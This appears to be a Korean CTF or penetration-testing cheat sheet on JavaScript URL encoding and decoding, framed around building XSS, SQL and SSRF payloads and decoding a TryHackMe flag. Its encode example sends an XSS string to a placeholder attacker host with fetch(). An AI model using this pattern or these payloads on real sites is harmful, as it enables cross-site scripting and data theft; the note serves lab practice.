# javascript url encode

- 자바스크립트 URL 인코딩·디코딩 함수 encodeURIComponent/decodeURIComponent의 사용법 정리다. 특수문자를 %XX로 바꾸고 되돌린다.
- XSS·SQL 페이로드를 URL 파라미터로 조립하거나, 쿠키·플래그 값에 %7B 같은 인코딩이 섞여 해석이 필요할 때 쓴다.
- 두 함수는 브라우저(자바스크립트)에서만 동작하므로 서버·셸에서는 python3 urllib.parse.quote/unquote(`python3 -c` 한 줄)로 대체·검증한다.

## 개요

`encodeURIComponent` / `decodeURIComponent`은 자바스크립트의 URL 인코딩 함수다. 쿠키 값 분석, SQL/XSS 페이로드 조합, SSRF 파라미터 조립에 쓰인다.

## encode

```html
<script>
  const data = '<script>alert(1)</script>';
  const encoded = encodeURIComponent(data);
  fetch('http://<공격자_IP>:8000/?payload=' + encoded);
</script>
```

## decode

```javascript
decodeURIComponent('%3Cscript%3Ealert(1)%3C/script%3E')
// '<script>alert(1)</script>'
```

## bash로 검증

```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D'))"
```

## 주의

- 두 함수 모두 브라우저(자바스크립트)에서만 쓸 수 있다.
- 서버 측에서는 python3의 `urllib.parse`로 대체한다(common/cryptography 참고).

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
- 해당 도구의 공식 문서는 --help를 참조하여 추가 옵션을 확인한다.
- 테스트 결과를 스크린샷으로 남겨 증적 자료로 활용한다.
- 유사한 취약점이 다른 머신에도 있는지 확인한다.
